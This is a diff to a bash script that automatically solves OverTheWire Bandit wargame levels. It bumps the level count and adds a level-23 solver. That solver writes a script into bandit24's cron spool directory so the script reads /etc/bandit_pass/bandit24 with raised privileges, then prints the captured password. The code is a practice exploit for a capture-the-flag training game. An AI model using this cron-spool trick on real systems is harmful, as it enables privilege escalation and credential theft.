@@ -1,7 +1,7 @@
 #!/bin/bash
 
 #VARIABLES
-MAX_LEVEL=23
+MAX_LEVEL=24
 PASSWORD="bandit0"
 
 if ! [[ "$1" =~ ^[0-9]+$ ]]; then
@@ -226,8 +226,31 @@ solve_level_21(){
 }
 
 solve_level_22(){
-	TMP_FILE=$(echo I am user bandit23 | md5sum  | cut -d ' ' -f 1)
-	cat "/tmp/$TMP_FILE"
+	TEMP_FILE=$(echo I am user bandit23 | md5sum  | cut -d ' ' -f 1)
+	cat "/tmp/$TEMP_FILE"
+}
+
+solve_level_23(){
+	TEMP_DIR=$(mktemp -d)
+	cd "$TEMP_DIR"
+	chmod 777 "$TEMP_DIR"
+
+	touch password
+	chmod 666 password
+
+	touch script.sh
+	chmod 777 script.sh
+
+	echo "#!/bin/bash
+	cat /etc/bandit_pass/bandit24 > $TEMP_DIR/password" > script.sh
+
+	mv script.sh /var/spool/bandit24/foo/
+
+	while [ -e /var/spool/bandit24/foo/script.sh ] 2>/dev/null; do
+		sleep 1
+	done
+
+	cat password
 }
 
 #CACHE FUNCTION
